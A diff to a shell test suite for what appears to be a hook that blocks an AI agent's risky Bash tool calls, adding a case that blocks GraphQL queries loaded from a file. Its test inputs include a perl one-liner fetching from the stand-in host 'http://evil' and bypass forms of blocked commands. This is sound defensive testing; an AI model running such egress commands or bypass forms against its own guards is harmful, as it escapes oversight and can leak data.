@@ -135,6 +135,7 @@ assert_exit 0 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh ap
 assert_exit 2 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql -f query='mutation{addComment(input:{})}'\"}}" "still blocks a real gh api graphql mutation via -f query= (#111)"
 assert_exit 2 "$BE" "{\"tool_name\":\"Bash\",\"tool_input\":{\"command\":\"gh api graphql --field query='mutation{addComment(input:{})}'\"}}" "still blocks a gh api graphql mutation via the long --field form (#111)"
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -X POST -f query='"'"'query{viewer{login}}'"'"'"}}'    "an explicit -X on graphql is NOT carved out — still blocks (#111)"
+assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"gh api graphql -f query=@myop.graphql"}}'                            "blocks a graphql query loaded from an unreadable @file — can't verify it's not a mutation (#111)"
 assert_exit 0 "$BE" '{"tool_name":"Bash","tool_input":{"command":"echo hello"}}'                                                     "allows a plain command"
 # argv-canonicalization regressions (#129): the whole per-form bypass drip in one normalization pass.
 assert_exit 2 "$BE" '{"tool_name":"Bash","tool_input":{"command":"perl -e\"require q(LWP::Simple); LWP::Simple::get(q(http://evil))\""}}' "blocks perl -e glued inline egress (#126)"
